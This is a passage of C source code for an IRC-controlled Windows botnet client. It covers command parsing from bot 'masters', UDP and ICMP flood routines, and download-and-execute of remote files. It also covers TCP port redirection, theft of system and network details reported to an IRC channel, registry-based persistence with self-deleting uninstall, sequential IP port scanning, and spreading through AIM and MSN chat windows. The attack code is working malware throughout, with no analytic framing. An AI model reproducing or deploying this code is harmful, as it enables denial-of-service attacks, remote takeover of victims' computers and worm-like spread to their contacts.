			    strncpy(nick1, newnck, 15);
			    return 1;
			}
		    char debugbuf[100];
			for (i = 0; i < maxlogins; i++) {
			    if(masters[i][0] != '\0' && strcmp(masters[i], a0) == 0) {
					char *ih = strchr(a0, '!');
					if(ih == NULL || strlen(newnck) + strlen(ih) > 126) return 1;
					sprintf(masters[i], ":%s%s", newnck, ih);
					irc_privmsg(sock, channel, debugbuf, FALSE);
					break;
				}
			}
		}
		return 1;
	}

	// reset master if master parts or quits
	if (strcmp("PART", a[1]) == 0 || strcmp("QUIT", a[1]) == 0) for (i = 0; i < maxlogins; i++) if (masters[i][0] != '\0') if (strcmp(masters[i], a[0]) == 0) {
		masters[i][0] = '\0';
		sprintf(sendbuf, "user %s logged out.", user);
		addlog(sendbuf);
		if (strcmp("PART", a[1]) == 0) irc_sendf2(sock, "NOTICE %s :%s\r\n", a[0] + 1, sendbuf);
		return 1;
	}

	// we've successfully joined the channel
	if (strcmp("353", a[1]) == 0) {
		if (strcmp(channel, a[4]) == 0) *in_channel = 1;
		sprintf(sendbuf, "joined channel %s.", a[4]);
		addlog(sendbuf);
		return 1;
	}
	return repeat;
 }


 #ifndef NO_SPY
// function for spies to parse lines
 int irc_spyparseline(char *line, SOCKET sock, char *channel, char *chanpass, char *nick1, SOCKET hsock, char *hchannel, char *server)
 {
	char line1[512];
	char line2[512];
	int i;
	char *a[32];
	char a0[128];
	char nick[16];
	//[Tsuna] <fix reason="potential buffer overflow, most servers will allow 512+">
	//char sendbuf[256];
	char sendbuf[1024];
	//[Tsuna] </fix>

	strncpy(nick, nick1, sizeof(nick)-1);

	if (line == NULL) return 1;
	memset(line1, 0, sizeof(line1));
	memset(line2, 0, sizeof(line2));
	strncpy(line1, line, sizeof(line1)-1);
	strncpy(line2, line, sizeof(line2)-1);

	// split the current line up into seperate words
	a[0] = strtok(line2, " ");
	for(i = 1; i < 32; i++) a[i] = strtok(NULL, " ");

	if(a[1] == NULL) return 1;
	if(a[0][0] != '\n') strncpy(a0,  a[0], sizeof(a0)-1);

	// pong if we get a ping request from the server
	if(strcmp("PING", a[0]) == 0) {
		irc_sendf(sock, "PONG %s\r\n", a[1]+1);
		irc_sendf2(sock, "JOIN %s %s\r\n", channel, chanpass);
	}

	// looks like we're connected to the server, let's join the channel
	if(strcmp("001", a[1]) == 0 || strcmp("005", a[1]) == 0) irc_sendf2(sock, "JOIN %s %s\r\n", channel, chanpass);

	else if (strcmp("353", a[1]) == 0) {
		char *m = strstr(line1, a[5]);
		if (m != NULL) {
			_snprintf(sendbuf, sizeof(sendbuf), "[%s] *** Users in %s: %s", server, a[4], m+1);
			irc_privmsg(hsock, hchannel, sendbuf, FALSE);
		}
	}

	else if (strcmp("433", a[1]) == 0) {
		sprintf(sendbuf, "[%s] *** Nick %s already in use.", server, nick1);
		irc_privmsg(hsock, hchannel, sendbuf, FALSE);
		rndnick(nick1);
		irc_sendf(sock, "NICK %s\r\n", nick1);
		sprintf(sendbuf, "[%s] *** Trying to change nick to %s", server, nick1);
		irc_privmsg(hsock, hchannel, sendbuf, FALSE);
	}

	else if (strcmp("JOIN", a[1]) == 0) {
		sprintf(sendbuf, "[%s] --> Joins: %s joined", a[2]+1, strtok(line1, " ")+1);
		irc_privmsg(hsock, hchannel, sendbuf, FALSE);
	}

	else if (strcmp("PART", a[1]) == 0) {
		char *p = strchr(line1, ':');
        p = strchr(++p, ':'); // this is where we get the quit msg
		sprintf(sendbuf, "[%s] <-- Parts: %s left the channel (%s)", a[2]+1, strtok(line1, " ")+1, ++p);
		irc_privmsg(hsock, hchannel, sendbuf, FALSE);
	}

	else if (strcmp("KICK", a[1]) == 0) {
		char *k = strchr(line1, ':');
        k = strchr(++k, ':'); // this is where we get the kick msg
        
		if (strcmp(nick, a[3]) == 0) {
			irc_sendf2(sock, "JOIN %s %s\r\n", channel, chanpass);
			_snprintf(sendbuf, sizeof(sendbuf), "(!) I was kicked by %s (%s)\r\n", strtok(line1, " ")+1, ++k);
		} else _snprintf(sendbuf, sizeof(sendbuf), "[%s] *** %s was kicked by %s (%s)\r\n", a[2], a[3], strtok(line1, " ")+1, ++k);
		
		irc_privmsg(hsock, hchannel, sendbuf, FALSE);
	}

	else if (strcmp("QUIT", a[1]) == 0) {
        char *q = strchr(line1, ':');
        q = strchr(++q, ':'); // this is where we get the quit msg
        _snprintf(sendbuf, sizeof(sendbuf), "[%s] <<< Quits: %s (%s)", server, strtok(line1, " ")+1, ++q);
		irc_privmsg(hsock, hchannel, sendbuf, FALSE);
	}

	else if (strcmp("NICK", a[1]) == 0) {
		char *oldnck = strtok(a[0], "!") + 1;
		char *newnck = a[2] + 1;
		if (oldnck != NULL && newnck != NULL) if (strcmp(oldnck, nick1) == 0) strncpy(nick1,  newnck, 15);
		sprintf(sendbuf, "[%s] *** %s is now known as %s", server, oldnck, newnck);
		irc_privmsg(hsock, hchannel, sendbuf, FALSE);
	}

	else if (strcmp("MODE", a[1]) == 0) {
		char *u = strtok(a[0], "!") + 1;
		char *m = strstr(line1, a[3]);
			if (m != NULL) {
				_snprintf(sendbuf, sizeof(sendbuf), "[%s] *** %s sets mode: %s", a[2], u, m);
				irc_privmsg(hsock, hchannel, sendbuf, FALSE);
			}
	}

	else if (strcmp("PRIVMSG", a[1]) == 0 || strcmp("NOTICE", a[1]) == 0) {
		if (strstr(a[2], "#") == NULL) a[2] = strtok(a[0], "!") + 1;
		a[3]++;
		char *u = strtok(a[0], "!") + 1;
		if(*a[3] == '\1') {
		    if (strcmp("\1ACTION", a[3]) == 0) { // that's a /me ...
    			char *m = strstr(line1, "ACTION");
    			if (m != NULL) {
    				m += 7;
    				_snprintf(sendbuf, sizeof(sendbuf), "[%s] * %s %s", a[2], u, strtok(m, "\1"));
    				irc_privmsg(hsock, hchannel, sendbuf, FALSE);
    			}
    		} else { // that's another CTCP (bleh)
    		    char *c = strchr(line1, ':');
                c = strchr(++c, ':');
    		    _snprintf(sendbuf, sizeof(sendbuf), "[%s] Received CTCP %s from %s (%s)", a[2], a[3]+1, u, ++c);
    		    irc_privmsg(hsock, hchannel, sendbuf, FALSE);
    		}
		} else {
			char *m = strstr(line1, " :");
			if (m != NULL) {
				m += 2;
				_snprintf(sendbuf, sizeof(sendbuf), "[%s] <%s> %s", a[2], u, m);
				irc_privmsg(hsock, hchannel, sendbuf, FALSE);
			}
		}
	}

	return 1;
 }
 #endif

// irc send functions
 void irc_send(SOCKET sock, char *msg)
 {
	char msgbuf[512];

	memset(msgbuf, 0, sizeof(msgbuf));
	sprintf(msgbuf, "%s\r\n", msg);
	send(sock, msgbuf, strlen(msgbuf), 0);
 }


 void irc_sendf(SOCKET sock, char *msg, char *str)
 {
	char msgbuf[512];

	memset(msgbuf, 0, sizeof(msgbuf));
	sprintf(msgbuf, msg, str);
	send(sock, msgbuf, strlen(msgbuf), 0);
 }

 void irc_sendf2(SOCKET sock, char *msg, char *str, char *str2)
 {
	char msgbuf[512];

	memset(msgbuf, 0, sizeof(msgbuf));
	sprintf(msgbuf, msg, str, str2);
	send(sock, msgbuf, strlen(msgbuf), 0);
 }

 void irc_privmsg(SOCKET sock, char *dest, char *msg, BOOL notice)
 {
	char msgbuf[512];
	char *action;

	memset(msgbuf, 0, sizeof(msgbuf));
	if (notice) action = "NOTICE"; else action = "PRIVMSG";
	sprintf(msgbuf, "%s %s :%s\r\n", action, dest, msg);
	send(sock, msgbuf, strlen(msgbuf), 0);
 }

// search-and-replace function for strings
 char * replacestr(char *str, char *oldstr, char *newstr)
 {
	char *p;
	char str2[512];
	char str3[512];
	char str4[512];

	memset(str2, 0, sizeof(str2));
	memset(str3, 0, sizeof(str3));
	memset(str4, 0, sizeof(str4));
	strncpy(str2,  str, sizeof(str2)-1);
	if (strlen(newstr) > 384) newstr[384] = '\0';

	while (strstr(str2, oldstr) != NULL) {
		p = strstr(str2, oldstr);
		strncpy(str4,  p + strlen(oldstr), sizeof(str4)-1);
		p[0] = '\0';
		strncpy(str3,  str2, sizeof(str3)-1);
		if (p+1 != NULL && oldstr-1 != NULL) if (strlen(p+1) > strlen(oldstr-1)) sprintf(str2, "%s%s%s", str3, newstr, str4);
		 else sprintf(str2, "%s%s", str3, newstr);
		if (strstr(oldstr, newstr) != NULL) break;
	}
	strncpy(str,  str2, strlen(str2)+1);
	return str;
 }

 #ifndef NO_UDP
// function for sending udp packets
 DWORD WINAPI udp(LPVOID param)
 {
	ps udp;
	SOCKADDR_IN ssin;
	LPHOSTENT hostent = NULL;
	IN_ADDR iaddr;
	SOCKET usock;
	int i;

	// socket setup
	udp = *((ps *)param);
	ps *udps = (ps *)param;
	udps->gotinfo = TRUE;
	char *host = udp.host;
	usock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
	iaddr.s_addr = inet_addr(udp.host);
	if (iaddr.s_addr == INADDR_NONE) hostent = gethostbyname(udp.host);
	if (hostent == NULL && iaddr.s_addr == INADDR_NONE) {
		if (!udp.silent) irc_sendf2(udp.sock, "PRIVMSG %s :error sending packets to %s.\r\n", udp.chan, host);
		threads[udp.threadnum] = 0;
		threadd[udp.threadnum][0] = '\0';
		return 0;
	}
	if (hostent != NULL) ssin.sin_addr = *((LPIN_ADDR)*hostent->h_addr_list);
	else ssin.sin_addr = iaddr;

	srand(GetTickCount());
	if (udp.port == 0) ssin.sin_port = htons((rand() % 65500) + 1); else ssin.sin_port = htons(udp.port);
	if (udp.port < 1) udp.port = 1;
	if (udp.port > 65535) udp.port = 65535;

	udp.num = udp.num / 10;
	if (udp.delay == 0) udp.delay = 1;

	for (i = 0; i < udp.size; i++) pbuff[i] = (rand() % 255);
	while (udp.num-- > 0) {
		//change port every 10 packets (if one isn't specified)
		for (i = 0; i < 11; i++) {
			sendto(usock, pbuff, udp.size-(rand() % 10), 0, (LPSOCKADDR)&ssin, sizeof(ssin));
			Sleep(udp.delay);
		}
		if (udp.port == 0) ssin.sin_port = htons((rand() % 65500) + 1);
	}
	// free(ubuff);
	if (!udp.silent) irc_sendf2(udp.sock, "PRIVMSG %s :finished sending packets to %s.\r\n", udp.chan, host);

	threads[udp.threadnum] = 0;
	threadd[udp.threadnum][0] = '\0';
	return 0;
 }
 #endif

 #ifndef NO_PING
//  function for sending pings
 DWORD WINAPI ping(LPVOID param)
 {
	ps ping;
	HANDLE icmp;
	LPHOSTENT hostent = NULL;
	IN_ADDR iaddr;
	IPAddr ip;
	ICMP_ECHO_REPLY reply;
	int i;

	ping = *((ps *)param);
	ps *psp = (ps *)param;
	psp->gotinfo = TRUE;
	char *host = ping.host;

	icmp = (HANDLE)fIcmpCreateFile();

	iaddr.s_addr = inet_addr(ping.host);
	if (iaddr.s_addr == INADDR_NONE) hostent = gethostbyname(ping.host);
	if ((hostent == NULL && iaddr.s_addr == INADDR_NONE) || icmp == INVALID_HANDLE_VALUE) {
		if (!ping.silent) irc_sendf2(ping.sock, "PRIVMSG %s :error sending pings to %s.\r\n", ping.chan, host);
		threads[ping.threadnum] = 0;
		threadd[ping.threadnum][0] = '\0';
		return 0;
	}
	if (hostent != NULL) ip = *(DWORD*)*hostent->h_addr_list;
	else ip = iaddr.s_addr;

	memset(&reply, 0, sizeof(reply));
	reply.RoundTripTime = 0xffffffff;

  	if (ping.size > 65500) ping.size = 65500;
	if (ping.delay < 1) ping.delay = 1;
	for (i = 0; i < ping.num; i++) {
		fIcmpSendEcho(icmp, ip, pbuff, ping.size, NULL, &reply, sizeof(ICMP_ECHO_REPLY), ping.delay);
	}

	fIcmpCloseHandle(icmp);
	if (!ping.silent) irc_sendf2(ping.sock, "PRIVMSG %s :finished sending pings to %s.\r\n", ping.chan, host);

	threads[ping.threadnum] = 0;
	threadd[ping.threadnum][0] = '\0';
	return 0;
 }
 #endif

 #ifndef NO_DOWNLOAD
// function for downloading files/updating
 DWORD WINAPI webdownload(LPVOID param)
 {
	char fbuff[512];
	char tstr[256];
	HANDLE fh, f;
	DWORD r, d, start, total, speed;
	PROCESS_INFORMATION pinfo;
	STARTUPINFO sinfo;
	ds dl;
	dl = *((ds *)param);
	ds *dsp = (ds *)param;
	dsp ->gotinfo = TRUE;
	fh = InternetOpenUrl(ih, dl.url, NULL, 0, 0, 0);
	if (fh != NULL) {

		// open the file
		f = CreateFile(dl.dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
		// make sure that our file handle is valid
		if (f < (HANDLE)1) {
			if (!dl.silent) irc_sendf2(dl.sock, "PRIVMSG %s :couldn't open %s.\r\n", dl.chan, dl.dest);
			threads[dl.threadnum] = 0;
			threadd[dl.threadnum][0] = '\0';
			return 0;
		}

		total = 1;
		start = GetTickCount();

		do {
			memset(fbuff, 0, sizeof(fbuff));
			InternetReadFile(fh, fbuff, sizeof(fbuff), &r);
			WriteFile(f, fbuff, r, &d, NULL);
			total = total + r;
			if (dl.update != 1) sprintf(threadd[dl.threadnum], "file download (%s - %dkb transferred)", dl.url, total / 1024);
			 else sprintf(threadd[dl.threadnum], "update (%s - %dkb transferred)", dl.url, total / 1024);
		} while (r > 0);

		speed = total / (((GetTickCount() - start) / 1000) + 1);

		CloseHandle(f);

		//download isn't an update
		if (dl.update != 1) {
			sprintf(tstr, "downloaded %.1f kb to %s @ %.1f kb/sec.", total / 1024.0, dl.dest, speed / 1024.0);
			if (!dl.silent) irc_privmsg(dl.sock, dl.chan, tstr, FALSE);

			if (dl.run == 1) {
				ShellExecute(0, "open", dl.dest, NULL, NULL, SW_SHOW);
				if (!dl.silent) irc_sendf2(dl.sock, "PRIVMSG %s :opened %s.\r\n", dl.chan, dl.dest);
			}

		// download is an update
		} else {
			sprintf(tstr, "downloaded %.1f kb to %s @ %.1f kb/sec. updating...", total / 1024.0, dl.dest, speed / 1024.0);
			if (!dl.silent) irc_privmsg(dl.sock, dl.chan, tstr, FALSE);

			memset(&sinfo, 0, sizeof(STARTUPINFO));
			sinfo.cb = sizeof(sinfo);
			sinfo.wShowWindow = SW_HIDE;
			if (CreateProcess(NULL, dl.dest, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo) == TRUE) {
				uninstall();
				WSACleanup();
				exit(0);
			} else {
				if (!dl.silent) irc_privmsg(dl.sock, dl.chan, "update failed: error executing file.", FALSE);
			}
		}
	} else if (!dl.silent) irc_privmsg(dl.sock, dl.chan, "bad url, or dns error.", FALSE);

	InternetCloseHandle(fh);

	threads[dl.threadnum] = 0;
	threadd[dl.threadnum][0] = '\0';
	return 0;
 }
 #endif

 #ifndef NO_REDIRECT
// port redirect function
 DWORD WINAPI redirect(LPVOID param)
 {
	SOCKET rsock, clsock;
	SOCKADDR_IN rssin, cssin;
	rs redirect;
	DWORD id;

	redirect = *((rs *)param);
	rs *rsp = (rs *)param;
	rsp->gotinfo = TRUE;
	rsock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	WSAAsyncSelect(rsock, 0, WM_USER + 1, FD_READ);
	memset(&rssin, 0, sizeof(rssin));
	rssin.sin_family = AF_INET;
	rssin.sin_port = htons(redirect.lport);
	bind(rsock, (SOCKADDR *)&rssin, sizeof(rssin));

	csock[redirect.threadnum] = rsock;

	while(1) {
		if (listen(rsock, 10) == SOCKET_ERROR) break;
		clsock = accept(rsock, (SOCKADDR *)&cssin, NULL);
		if (clsock != INVALID_SOCKET) {
			redirect.csock = clsock;
			CreateThread(NULL, 0, &redirectloop, (void *)&redirect, 0, &id);
		}
	}

	closesocket(clsock);
	closesocket(rsock);

	threads[redirect.threadnum] = 0;
	threadd[redirect.threadnum][0] = '\0';

	return 0;
 }

// part of the redirect function, handles sending/recieving for the remote connection.
 DWORD WINAPI redirectloop(LPVOID param)
 {
	SOCKET sock;
	SOCKET csock;
	char *dest;
	SOCKADDR_IN ssin;
	IN_ADDR iaddr;
	LPHOSTENT hostent;
	int port, err;
	char buff[4096];
	rs rs2;
	rs2 = *((rs *)param);
	csock = rs2.csock;
	dest = rs2.dest;
	port = rs2.port;
	DWORD id;

	while (1) {
		sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
		memset(&ssin, 0, sizeof(ssin));
		ssin.sin_family = AF_INET;
		ssin.sin_port = htons(port);
		iaddr.s_addr = inet_addr(dest);
		if (iaddr.s_addr == INADDR_NONE) hostent = gethostbyname(dest);
		else hostent = gethostbyaddr((const char *)&iaddr, sizeof(struct in_addr), AF_INET);
		if (hostent == NULL) break;
		ssin.sin_addr = *((LPIN_ADDR)*hostent->h_addr_list);

		err = connect(sock, (LPSOCKADDR)&ssin, sizeof(SOCKADDR_IN));
		if (err == SOCKET_ERROR) break;

		rs2.sock = sock;
		CreateThread(NULL, 0, &redirectloop2, (void *)&rs2, 0, &id);

		while (1) {
			memset(buff, 0, sizeof(buff));
			err = recv(csock, buff, sizeof(buff), 0);
			if (err == 0) {
				break;
			}
			if (err == SOCKET_ERROR) break;

			err = send(sock, buff, err, 0);
			if (err == SOCKET_ERROR) break;

		}

		break;
	}

	closesocket(csock);
	closesocket(sock);

	return 0;
 }

// part of the redirect function, handles sending/recieving for the local connection.
 DWORD WINAPI redirectloop2(LPVOID param)
 {
	SOCKET sock;
	SOCKET csock;
	rs rs2;
	int err;
	char buff[4096];
	rs2 = *((rs *)param);
	sock = rs2.sock;
	csock = rs2.csock;

	while (1) {
		memset(buff, 0, sizeof(buff));
		err = recv(sock, buff, sizeof(buff), 0);
		if (err == 0) {
			break;
		}
		if (err == SOCKET_ERROR) break;
		err = send(csock, buff, err, 0);
		if (err == SOCKET_ERROR) break;
	}

	closesocket(csock);
	return 0;
 }
 #endif

  #ifndef NO_NETINFO
// function used for netinfo
 char * netinfo(char *ninfo, char *host, SOCKET sock)
 {

	SOCKADDR sa;
	int sas;
	DWORD n;
	char ctype[8];
	char cname[128];

	// get connection type/name
	memset(cname, 0, sizeof(cname));
	memset(ctype, 0, sizeof(ctype));
	if (!noigcse) {
		fInternetGetConnectedStateEx(&n, (char *)&cname, sizeof(cname), 0);
    	if (n & INTERNET_CONNECTION_MODEM == INTERNET_CONNECTION_MODEM) strncpy(ctype,  "dial-up", sizeof(ctype)-1);
	 	else strncpy(ctype,  "LAN", sizeof(ctype)-1);
	} else {
		strncpy(ctype, "N/A", sizeof(ctype)-1);
		strncpy(cname, "N/A", sizeof(cname)-1);
	}

	// get ip address
	sas = sizeof(sa);
	memset(&sa, 0, sizeof(sa));
	getsockname(sock, &sa, &sas);

	sprintf(ninfo, "connection type: %s (%s). local IP address: %d.%d.%d.%d. connected from: %s", ctype, cname, (BYTE)sa.sa_data[2], (BYTE)sa.sa_data[3], (BYTE)sa.sa_data[4], (BYTE)sa.sa_data[5], host);
	return ninfo; // return the netinfo string
 }
 #endif

 #ifndef NO_SYSINFO
// function used for sysinfo
  char * sysinfo(char *sinfo)
 {
	int total;
	MEMORYSTATUS memstat;
	OSVERSIONINFO verinfo;
	char szBuffer[MAX_COMPUTERNAME_LENGTH + 1];
	DWORD dwNameSize = MAX_COMPUTERNAME_LENGTH + 1;
	char *szCompname;
	TCHAR szUserName[21];
	DWORD dwUserSize = sizeof(szUserName);

	GlobalMemoryStatus(&memstat); // load memory info into memstat
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO); // required for some strange reason
	GetVersionEx(&verinfo); // load version info into verinfo
	char *os;
	char os2[140];
	if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0) {
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) os = "95";
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT) os = "NT";
	}
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 10) os = "98";
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 90) os = "ME";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0) os = "2000";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1) os = "XP";
	else os = "???";

	if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT && verinfo.szCSDVersion[0] != '\0') {
		sprintf(os2, "%s [%s]", os, verinfo.szCSDVersion);
		os = os2;
	}

	total = GetTickCount() / 1000; // GetTickCount() / 1000 = seconds since os started.

	GetComputerName(szBuffer, &dwNameSize);
	szCompname = szBuffer;
	GetUserName(szUserName, &dwUserSize);

	sprintf(sinfo, "cpu: %dMHz. ram: %dMB total, %dMB free. os: Windows %s (%d.%d, build %d). uptime: %dd %dh %dm. box: %s. user: %s.",
		cpuspeed(), memstat.dwTotalPhys / 1048576, memstat.dwAvailPhys / 1048576,
		os, verinfo.dwMajorVersion, verinfo.dwMinorVersion, verinfo.dwBuildNumber, total / 86400, (total % 86400) / 3600, ((total % 86400) % 3600) / 60, szCompname, szUserName);

	return sinfo; // return the sysinfo string
 }

// cpu speed function
 int cpuspeed(void)
 {
	unsigned __int64 startcycle;
	unsigned __int64 speed, num, num2;

	do {
		startcycle = cyclecount();
		Sleep(1000);
		speed = ((cyclecount()-startcycle)/100000)/10;
	} while (speed > 1000000); // if speed is 1000GHz+, then something probably went wrong so we try again =P

	// guess 'real' cpu speed by rounding raw cpu speed (something like 601mhz looks kinda tacky)
	num = speed % 100;
	num2 = 100;
	if (num < 80) num2 = 75;
	if (num < 71) num2 = 66;
	if (num < 55) num2 = 50;
	if (num < 38) num2 = 33;
	if (num < 30) num2 = 25;
	if (num < 10) num2 = 0;
	speed = (speed-num)+num2;

	return speed;
 }

// asm for cpuspeed() (used for counting cpu cycles)
 unsigned __int64 cyclecount(void)
 {
 	#if defined (__LCC__) // this code is for lcc
	unsigned __int64 count = 0;
	_asm ("rdtsc\n"
		  "mov %eax,%count\n");
	return count;

	#elif defined (__GNUC__) // this code is for GCC
	unsigned __int64 count = 0;
	__asm__ ("rdtsc;movl %%eax, %0" : "=r" (count));
	return count;

	#else // this code is for MSVC, may work on other compilers (ignore the warnings, MSVC is stupid...)
	_asm {
		_emit 0x0F;
		_emit 0x31;
	}
	#endif
 }
 #endif

 #ifndef NO_VISIT
// url visit function
 DWORD WINAPI visit(LPVOID param)
 {
	URL_COMPONENTS url;
	HINTERNET ch, req;
	const char *accept = "*/*";
	char *error = "error visiting URL.";
	vs visit;
	char vhost[128];
	int vport;
	char vuser[128];
	char vpass[128];
	char vpath[256];

	visit = *((vs *)param);
	vs *vsp = (vs *)param;
	vsp->gotinfo = TRUE;

	// zero out string varaiables
	memset(vhost, 0, sizeof(vhost));
	memset(vuser, 0, sizeof(vuser));
	memset(vpass, 0, sizeof(vpass));
	memset(vpath, 0, sizeof(vpath));

	// zero out url structure and set options
	memset(&url, 0, sizeof(url));
	url.dwStructSize = sizeof(url);
	url.dwHostNameLength = 1;
    url.dwUserNameLength = 1;
    url.dwPasswordLength = 1;
    url.dwUrlPathLength = 1;

	do {
		// crack the url (break it into its main parts)
		if (!InternetCrackUrl(visit.host, strlen(visit.host), 0, &url)) {
			if (!visit.silent) irc_privmsg(visit.sock, visit.chan, "invalid URL.", FALSE);
				break;
			}

		// copy url parts into variables
		if (url.dwHostNameLength > 0) strncpy(vhost, url.lpszHostName, url.dwHostNameLength);
		vport = url.nPort;
		if (url.dwUserNameLength > 0) strncpy(vuser, url.lpszUserName, url.dwUserNameLength);
		if (url.dwPasswordLength > 0) strncpy(vpass, url.lpszPassword, url.dwPasswordLength);
		if (url.dwUrlPathLength > 0) strncpy(vpath, url.lpszUrlPath, url.dwUrlPathLength);

		ch = InternetConnect(ih, vhost, vport, vuser, vpass, INTERNET_SERVICE_HTTP, 0, 0);
		if (ch == NULL) {
			if (!visit.silent) irc_privmsg(visit.sock, visit.chan, error, FALSE);
			break;
		}

		req = HttpOpenRequest(ch, NULL, vpath, NULL, visit.referer, &accept, INTERNET_FLAG_NO_UI, 0);
		if (req == NULL) {
			if (!visit.silent) irc_privmsg(visit.sock, visit.chan, error, FALSE);
			break;
		}

		if (HttpSendRequest(req, NULL, 0, NULL, 0)) {
			if (!visit.silent) irc_privmsg(visit.sock, visit.chan, "url visited.", FALSE);
		} else {
			if (!visit.silent) irc_privmsg(visit.sock, visit.chan, error, FALSE);
		}
	} while(0); // always false, so this never loops, only helps make error handling easier

	InternetCloseHandle(ch);
	InternetCloseHandle(req);
	return 0;
 }
 #endif

 // function for removing the bot's registry entries and executable
 void uninstall(void)
 {
	HKEY key;
	HANDLE f;
	DWORD r;
	PROCESS_INFORMATION pinfo;
	STARTUPINFO sinfo;
	char cmdline[256];
	char tcmdline[256];
	char cfilename[256];
	char batfile[256];

	// remove our registry entries
	if (regrun) {
		RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
		RegDeleteValue(key, valuename);
		RegCloseKey(key);
	}

	if (regrunservices) {
		RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
		RegDeleteValue(key, valuename);
		RegCloseKey(key);
	}

	sprintf(batfile, "%s\\r.bat", tempdir);
	f = CreateFile(batfile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
	if (f > (HANDLE)0) {
		// write a batch file to remove our executable once we close
		WriteFile(f, "@echo off\r\n"
					 ":start\r\nif not exist \"\"%1\"\" goto done\r\n"
					 "del /F \"\"%1\"\"\r\n"
					 "del \"\"%1\"\"\r\n"
					 "goto start\r\n"
					 ":done\r\n"
					 "del /F %temp%\r.bat\r\n"
					 "del %temp%\r.bat\r\n", 105, &r, NULL);
		CloseHandle(f);

		memset(&sinfo, 0, sizeof(STARTUPINFO));
		sinfo.cb = sizeof(sinfo);
		sinfo.wShowWindow = SW_HIDE;

		GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));// get our file name
		sprintf(tcmdline, "%%comspec%% /c %s %s", batfile, cfilename); // build command line
		ExpandEnvironmentStrings(tcmdline, cmdline, sizeof(cmdline)); // put the name of the command interpreter into the command line

		// execute the batch file
		CreateProcess(NULL, cmdline, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo);
	}
 }
 
#ifndef NO_SCAN
// checks ip for open port
 DWORD WINAPI ip_connect(LPVOID param)
 {
	SOCKET sock;
	SOCKADDR_IN ssin;
	DWORD err;
	char str[256];
	scans scan;

	scan = *((scans *)param);
	scans *scanp = (scans *)param;
	scanp->cgotinfo = TRUE;

	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
	ssin.sin_port = htons(scan.port);
	ssin.sin_addr = scan.addy;

	sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	err = connect(sock, (LPSOCKADDR)&ssin, sizeof(SOCKADDR_IN));
	if (err != SOCKET_ERROR) {
		sprintf(str, "%s port %d is open", inet_ntoa(scan.addy), scan.port);
		irc_privmsg(scan.sock, scan.chan, str, scan.notice);
	}
	closesocket(sock);
	return 0;

 }

// scan a range of ips for an open port
 DWORD WINAPI ip_scan(LPVOID param)
 {
	DWORD id, host;
	void *th;
	char str[128];
	scans scan;

	scan = *((scans *)param);
	scans *scanp = (scans *)param;
	scanp->gotinfo = TRUE;

	while(1) {
		sprintf(str, "scan (%s:%d)", inet_ntoa(scan.addy), scan.port);
		strncpy(threadd[scan.threadnum], str, sizeof(threadd[scan.threadnum])-1);
		th = CreateThread(NULL, 0, &ip_connect, (void *)&scan, 0, &id);
		while(1) {
			if (scan.cgotinfo == TRUE) break;
			Sleep(1);
		}
		CloseHandle(th);
		scanp->cgotinfo = FALSE;
		Sleep(scanp->delay);
		memcpy(&host, &scan.addy, 4);
		host = ntohl(host);
		host += 1;
		host = htonl(host);
		memcpy(&scan.addy, &host, 4);
	}

	threads[scan.threadnum] = 0;
	threadd[scan.threadnum][0] = '\0';
	return 0;
 }
#endif

#ifndef NO_IMSPREAD
BOOL CALLBACK EnumAIMChild(HWND hwnd, LPARAM lParam) 
{
	char ClassName[255];
	char IMText[55];
	if (!GetClassName(hwnd,ClassName,sizeof(ClassName)))
		return false;
	if(!strcmp(ClassName,"Ate32Class"))
	{
		SendMessage(hwnd,WM_GETTEXT,sizeof(IMText),(LPARAM)IMText);
		if(IMText[55]=='E'||IMText[0]!='<')
		{
			SendMessage(hwnd,WM_SETTEXT,0,(LPARAM)IMmsg); 
			SendMessage(hwnd,WM_KEYDOWN,VK_RETURN,0);
			SendMessage(hwnd,WM_KEYUP,VK_RETURN,0);
		}
	}
	return true;
}

BOOL CALLBACK EnumAIM(HWND hwnd, LPARAM lParam) 
{
	char ClassName[255];
	if (!GetClassName(hwnd,ClassName,sizeof(ClassName)))
		return false;
	if(!strcmp(ClassName,"AIM_IMessage"))
		EnumChildWindows(hwnd,EnumAIMChild,0);
	return true;
}

BOOL CALLBACK EnumMSNChild(HWND hwnd, LPARAM lParam) 
{
	char ClassName[255];
	char IMText[8];
	if (!GetClassName(hwnd,ClassName,sizeof(ClassName)))
		return false;
	if(!strcmp(ClassName,"RichEdit20W"))
	{
		SendMessage(hwnd,WM_GETTEXT,sizeof(IMText),(LPARAM)IMText);
		if(strcmp(IMText,"  Never\0"))
		{
			SendMessage(hwnd,WM_SETTEXT,0,(LPARAM)IMmsg); 
			SendMessage(hwnd,WM_KEYDOWN,VK_RETURN,0);
			SendMessage(hwnd,WM_KEYUP,VK_RETURN,0);
		}
	}
	return true;
}


BOOL CALLBACK EnumMSN(HWND hwnd, LPARAM lParam) 
{
	char ClassName[255];
